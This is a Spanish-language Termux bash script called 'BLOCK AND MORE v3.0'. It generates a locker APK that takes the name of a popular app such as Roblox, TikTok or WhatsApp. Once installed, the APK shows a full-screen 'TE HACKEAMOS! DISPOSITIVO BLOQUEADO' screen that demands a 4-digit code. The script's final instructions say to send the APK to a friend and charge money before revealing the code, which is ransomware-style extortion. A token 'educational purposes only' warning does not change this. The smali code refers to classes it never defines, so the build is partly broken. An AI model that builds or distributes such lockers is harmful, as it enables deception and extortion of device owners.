#!/data/data/com.termux/files/usr/bin/bash

CYAN='\033[0;36m'
AMARILLO='\033[1;33m'
VERDE='\033[0;32m'
BLANCO='\033[1;37m'
ROJO='\033[0;31m'
NC='\033[0m'

clear

echo -e "${CYAN}"
echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
echo -e "${AMARILLO}        [ BLOCK AND MORE v3.0 ]${NC}\n"

# ============================================
# LISTA DE APPS
# ============================================
APPS=(
    "Roblox" "Free Fire" "TikTok" "Instagram"
    "Facebook" "WhatsApp" "YouTube" "Minecraft"
    "PUBG Mobile" "Clash of Clans" "Spotify" "Netflix"
)

# ============================================
# FUNCIÓN: MOSTRAR MENÚ
# ============================================
mostrar_menu() {
    echo -e "${BLANCO}[+] Selecciona una app para generar su BLOCK APK:${NC}\n"
    for i in "${!APPS[@]}"; do
        num=$((i+1))
        printf " ${AMARILLO}[%02d]${NC} ${VERDE}%-13s${NC}" "$num" "${APPS[$i]}"
        if [ $((num % 4)) -eq 0 ]; then
            echo ""
        fi
    done
    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================
# FUNCIÓN: GENERAR APK CON APKTOOL
# ============================================
generar_apk() {
    local app="$1"
    local codigo="$2"
    
    echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
    echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}"
    echo -e "${AMARILLO}[*] Creando APK...${NC}\n"
    
    # Preparar directorios
    mkdir -p ~/block_temp
    cd ~/block_temp
    
    # ============================================
    # PASO 1: DESCARGAR APK BASE
    # ============================================
    echo -e "${AMARILLO}[*] Descargando APK base...${NC}"
    
    # Usar una APK simple de muestra (la creamos manualmente)
    # Crear una APK simple con estructura mínima
    mkdir -p base_apk
    cd base_apk
    
    # Crear AndroidManifest.xml
    cat > AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.block.phone"
    android:versionCode="1"
    android:versionName="1.0">
    
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="Block Phone"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleInstance"
            android:showOnLockScreen="true"
            android:turnScreenOn="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF
    
    # Crear carpetas
    mkdir -p smali/com/block/phone
    mkdir -p res/drawable
    mkdir -p res/layout
    mkdir -p res/values
    
    # ============================================
    # PASO 2: CREAR SMALI (código compilado)
    # ============================================
    cat > smali/com/block/phone/MainActivity.smali << 'EOF'
.class public Lcom/block/phone/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

# instance fields
.field private CODIGO_CORRECTO:Ljava/lang/String;

.field private bloqueado:Z

.field private codigoInput:Landroid/widget/EditText;

.field private desbloquearBtn:Landroid/widget/Button;

.field private handler:Landroid/os/Handler;

.field private intentos:I

.field private mensajeError:Landroid/widget/TextView;

.field private tiempoEspera:I

.field private timerText:Landroid/widget/TextView;


# direct methods
.method public constructor <init>()V
    .registers 2

    .line 12
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 15
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/block/phone/MainActivity;->handler:Landroid/os/Handler;

    .line 16
    const/4 v0, 0x0

    iput v0, p0, Lcom/block/phone/MainActivity;->intentos:I

    .line 17
    iput v0, p0, Lcom/block/phone/MainActivity;->tiempoEspera:I

    .line 18
    iput-boolean v0, p0, Lcom/block/phone/MainActivity;->bloqueado:Z

    .line 19
    const-string v0, "CODIGO"

    iput-object v0, p0, Lcom/block/phone/MainActivity;->CODIGO_CORRECTO:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 5

    .line 24
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 25
    const p1, 0x7f030001

    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->setContentView(I)V

    .line 27
    invoke-virtual {p0}, Lcom/block/phone/MainActivity;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/16 v0, 0x400

    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setFlags(II)V

    .line 30
    const p1, 0x7f070001

    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/EditText;

    iput-object p1, p0, Lcom/block/phone/MainActivity;->codigoInput:Landroid/widget/EditText;

    .line 31
    const p1, 0x7f060001

    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/Button;

    iput-object p1, p0, Lcom/block/phone/MainActivity;->desbloquearBtn:Landroid/widget/Button;

    .line 32
    const p1, 0x7f080001

    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    iput-object p1, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;

    .line 33
    const p1, 0x7f090001

    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    iput-object p1, p0, Lcom/block/phone/MainActivity;->timerText:Landroid/widget/TextView;

    .line 35
    iget-object p1, p0, Lcom/block/phone/MainActivity;->desbloquearBtn:Landroid/widget/Button;

    new-instance v0, Lcom/block/phone/MainActivity$1;

    invoke-direct {v0, p0}, Lcom/block/phone/MainActivity$1;-><init>(Lcom/block/phone/MainActivity;)V

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 52
    return-void
.end method

# virtual methods
.method private verificarCodigo()V
    .registers 4

    .line 55
    iget-object v0, p0, Lcom/block/phone/MainActivity;->codigoInput:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    .line 57
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_1d

    .line 58
    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;

    const-string v1, "Ingresa el c\u00f3digo"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 59
    return-void

    .line 62
    :cond_1d
    iget-object v1, p0, Lcom/block/phone/MainActivity;->CODIGO_CORRECTO:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_44

    .line 63
    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;

    const-string v1, "C\u00f3digo correcto"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 64
    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;

    const v1, -0xff0100

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V

    .line 65
    iget-object v0, p0, Lcom/block/phone/MainActivity;->handler:Landroid/os/Handler;

    new-instance v1, Lcom/block/phone/MainActivity$2;

    invoke-direct {v1, p0}, Lcom/block/phone/MainActivity$2;-><init>(Lcom/block/phone/MainActivity;)V

    const-wide/16 v2, 0x7d0

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 76
    goto :goto_7e

    .line 77
    :cond_44
    iget v0, p0, Lcom/block/phone/MainActivity;->intentos:I

    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Lcom/block/phone/MainActivity;->intentos:I

    .line 78
    iget v0, p0, Lcom/block/phone/MainActivity;->intentos:I

    mul-int/lit8 v0, v0, 0x3c

    iput v0, p0, Lcom/block/phone/MainActivity;->tiempoEspera:I

    .line 79
    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "C\u00f3digo incorrecto. Espera "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget v2, p0, Lcom/block/phone/MainActivity;->tiempoEspera:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "s"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 80
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/block/phone/MainActivity;->bloqueado:Z

    .line 81
    invoke-direct {p0}, Lcom/block/phone/MainActivity;->iniciarTemporizador()V

    .line 83
    :goto_7e
    return-void
.end method

.method private iniciarTemporizador()V
    .registers 2

    .line 86
    new-instance v0, Lcom/block/phone/MainActivity$3;

    invoke-direct {v0, p0}, Lcom/block/phone/MainActivity$3;-><init>(Lcom/block/phone/MainActivity;)V

    invoke-virtual {v0}, Lcom/block/phone/MainActivity$3;->run()V

    .line 109
    return-void
.end method
EOF
    
    # ============================================
    # PASO 3: CREAR LAYOUT
    # ============================================
    cat > res/layout/activity_main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#CC0000">
    
    <LinearLayout
        android:layout_width="340dp"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:background="#FF0000"
        android:padding="25dp"
        android:orientation="vertical"
        android:elevation="15dp">
        
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="⚠️"
            android:textSize="70sp" />
        
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="¡TE HACKEAMOS!"
            android:textColor="#FFFFFF"
            android:textSize="28sp"
            android:textStyle="bold"
            android:layout_marginTop="5dp" />
        
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="⚠️ DISPOSITIVO BLOQUEADO ⚠️"
            android:textColor="#FFFF00"
            android:textSize="14sp"
            android:layout_marginTop="5dp" />
        
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="Ingresa el código de 4 dígitos"
            android:textColor="#FFFFFF"
            android:textSize="13sp"
            android:gravity="center"
            android:layout_marginTop="15dp"
            android:layout_marginBottom="15dp" />
        
        <EditText
            android:id="@+id/codigoInput"
            android:layout_width="match_parent"
            android:layout_height="55dp"
            android:background="#FFFFFF"
            android:hint="CÓDIGO DE 4 DÍGITOS"
            android:inputType="number"
            android:textColor="#000000"
            android:textSize="22sp"
            android:gravity="center"
            android:padding="10dp" />
        
        <Button
            android:id="@+id/desbloquearBtn"
            android:layout_width="match_parent"
            android:layout_height="55dp"
            android:background="#FF0000"
            android:text="🔓 DESBLOQUEAR"
            android:textColor="#FFFFFF"
            android:textSize="18sp"
            android:textStyle="bold"
            android:layout_marginTop="10dp" />
        
        <TextView
            android:id="@+id/mensajeError"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text=""
            android:textColor="#FFFF00"
            android:textSize="13sp"
            android:layout_marginTop="10dp" />
        
        <TextView
            android:id="@+id/timerText"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text=""
            android:textColor="#FFFFFF"
            android:textSize="16sp"
            android:layout_marginTop="5dp" />
            
    </LinearLayout>
</RelativeLayout>
EOF
    
    # ============================================
    # PASO 4: ICONO
    # ============================================
    echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
    
    # ============================================
    # PASO 5: RECURSOS (strings.xml)
    # ============================================
    cat > res/values/strings.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Block Phone</string>
</resources>
EOF
    
    # ============================================
    # PASO 6: RECOMPILAR CON APKTOOL
    # ============================================
    echo -e "${AMARILLO}[*] Recompilando APK...${NC}"
    
    # Volver a la carpeta base
    cd ..
    
    # Usar apktool para construir la APK
    apktool b base_apk -o app_unsigned.apk 2>/dev/null
    
    if [ ! -f "app_unsigned.apk" ]; then
        echo -e "${ROJO}[!] Error con apktool. Creando APK manual...${NC}"
        # Crear APK manual con zip
        cd base_apk
        zip -r ../app_unsigned.apk * 2>/dev/null
        cd ..
    fi
    
    # ============================================
    # PASO 7: FIRMAR
    # ============================================
    echo -e "${AMARILLO}[*] Firmando APK...${NC}"
    
    if [ ! -f ~/debug.keystore ]; then
        keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
    fi
    
    # Firmar
    apksigner sign --keystore ~/debug.keystore --storepass android --keypass android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
    
    if [ ! -f "${app}_block.apk" ]; then
        echo -e "${ROJO}[!] Error al firmar. Usando APK sin firmar...${NC}"
        cp app_unsigned.apk "${app}_block.apk"
    fi
    
    # ============================================
    # PASO 8: MODIFICAR EL CÓDIGO EN LA APK
    # ============================================
    echo -e "${AMARILLO}[*] Inyectando código: ${VERDE}$codigo${NC}"
    
    # Extraer, modificar y re-empaquetar
    if [ -f "${app}_block.apk" ]; then
        # Descompilar para modificar el código
        apktool d "${app}_block.apk" -o modified 2>/dev/null
        
        if [ -d "modified" ]; then
            # Cambiar el código en smali
            find modified -name "*.smali" -exec sed -i "s/CODIGO/$codigo/g" {} \;
            
            # Cambiar el nombre de la app
            find modified -name "AndroidManifest.xml" -exec sed -i "s/Block Phone/$app/g" {} \;
            
            # Recompilar
            apktool b modified -o "${app}_block_final.apk" 2>/dev/null
            
            if [ -f "${app}_block_final.apk" ]; then
                # Firmar
                apksigner sign --keystore ~/debug.keystore --storepass android --keypass android --out "${app}_block.apk" "${app}_block_final.apk" 2>/dev/null
            fi
        fi
    fi
    
    # ============================================
    # PASO 9: MOVER A DESCARGA
    # ============================================
    if [ -f "${app}_block.apk" ]; then
        mv "${app}_block.apk" ~/storage/downloads/
        cd ~
        rm -rf ~/block_temp
        
        clear
        echo -e "${CYAN}==================================================${NC}"
        echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
        echo -e "${CYAN}==================================================${NC}\n"
        echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
        echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
        echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
        echo -e "\n${ROJO}📱 AL ABRIR LA APK VERÁS:${NC}"
        echo -e "   ${ROJO}┌─────────────────────────────────┐${NC}"
        echo -e "   ${ROJO}│  ⚠️  ¡TE HACKEAMOS!  ⚠️         │${NC}"
        echo -e "   ${ROJO}│  🔒 DISPOSITIVO BLOQUEADO      │${NC}"
        echo -e "   ${ROJO}│                                 │${NC}"
        echo -e "   ${ROJO}│  [CÓDIGO DE 4 DÍGITOS]         │${NC}"
        echo -e "   ${ROJO}│  [🔓 DESBLOQUEAR]              │${NC}"
        echo -e "   ${ROJO}└─────────────────────────────────┘${NC}"
        echo -e "\n${BLANCO}[*] Instrucciones:${NC}"
        echo -e "  1. Envía el APK a tu amigo"
        echo -e "  2. Debe instalar la APK"
        echo -e "  3. Para desbloquear debe ingresar: ${VERDE}$codigo${NC}"
        echo -e "  4. Cada error suma 1 minuto de espera"
        echo -e "  5. 💰 Cobra antes de darle el código"
        echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
        echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    else
        echo -e "${ROJO}[!] Error al generar la APK.${NC}"
        cd ~
        rm -rf ~/block_temp
    fi
}

# ============================================
# MENÚ PRINCIPAL
# ============================================
while true; do
    clear
    echo -e "${CYAN}"
    echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
    echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
    echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
    echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
    echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
    echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
    echo -e "${AMARILLO}        [ BLOCK AND MORE v3.0 ]${NC}\n"
    
    mostrar_menu
    read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
    
    if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
        APP_SELECCIONADA="${APPS[$((opcion-1))]}"
        
        echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos para el bloqueo:${NC}"
        while true; do
            read -p ">> Código (1000-9999): " CODIGO < /dev/tty
            if [[ "$CODIGO" =~ ^[0-9]{4}$ ]] && [ "$CODIGO" -ge 1000 ] && [ "$CODIGO" -le 9999 ]; then
                break
            else
                echo -e "${ROJO}[!] Código inválido. Debe ser de 4 dígitos (1000-9999).${NC}"
            fi
        done
        
        generar_apk "$APP_SELECCIONADA" "$CODIGO"
        read -p "Presiona Enter para continuar..."
    else
        echo -e "${ROJO}[!] Opción inválida. Elige un número del 01 al ${#APPS[@]}.${NC}"
        sleep 2
    fi
done
